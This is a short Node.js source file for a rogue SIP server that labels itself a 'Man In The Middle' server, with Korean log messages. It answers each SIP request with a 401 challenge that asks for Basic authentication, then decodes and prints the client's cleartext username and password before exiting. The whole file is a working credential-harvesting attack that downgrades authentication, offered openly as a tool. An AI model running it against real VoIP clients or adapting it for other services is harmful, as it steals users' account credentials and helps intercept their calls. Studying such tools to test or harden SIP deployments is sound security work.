var PORT = 5060;
var HOST = '0.0.0.0';
var dgram = require('dgram');
var server = dgram.createSocket({
    type: 'udp4',
    reuseAddr: true,
});
server.on('listening', function () {
    var address = server.address();
    console.log('Man In The Middle™ SIP server running at ' + address.address + ":" + address.port);
});
server.on('message', function (message, remote) {
    message = `${message}`;
    let lines = message.split("\r\n");
    let method, protocol;
    let sipaddr;
    let headers = [];
    [method, sipaddr, protocol] = lines[0].split(' ');
    for(let line of lines.slice(1)) {
        let name, value;
        let splitted_result = line.match(/^(.*?):\s*(.*)/);
        if(!splitted_result) continue;
        [,name,value] = splitted_result;
        if(!name)continue;
        headers[name] = value;
    }
    console.log(`클라이언트 ${remote.address}:${remote.port} 접속`);

    if(headers['Authorization']) {
        let authinfo = headers['Authorization'].split(' ');
        if(authinfo[0] === 'Basic' && authinfo[1]) {
            let id, password;
            [id, password] = (new Buffer(authinfo[1], 'base64')).toString('utf8').split(':');
            console.log('인증 정보:', `ID: "${id}", PASS: "${password}"`);
        }
        else {
            console.log('인증 실패:', `인증 형태 협상에 실패했거나 올바른 요청이 아닙니다. (${authinfo[0]} ${authinfo[1]})`);
        }
        process.exit();
    }

    let response_arr = [
        'SIP/2.0 401 Unauthorized',
        `Via: ${headers['Via']}`,
        `To: ${headers['To']};tag=maninthemiddle`,
        `From: ${headers['From']}`,
        `Call-ID: ${headers['Call-ID']}`,
        `CSeq: ${headers['CSeq']}`,
        `WWW-Authenticate: Basic realm="maninthemiddle"`,
        'Content-Length: 0',
    ];
    console.log(`인증 협상 중...`);
    server.send(`${response_arr.join('\r\n')}\r\n\r\n`, remote.port, remote.address);
});
server.bind(PORT, HOST);
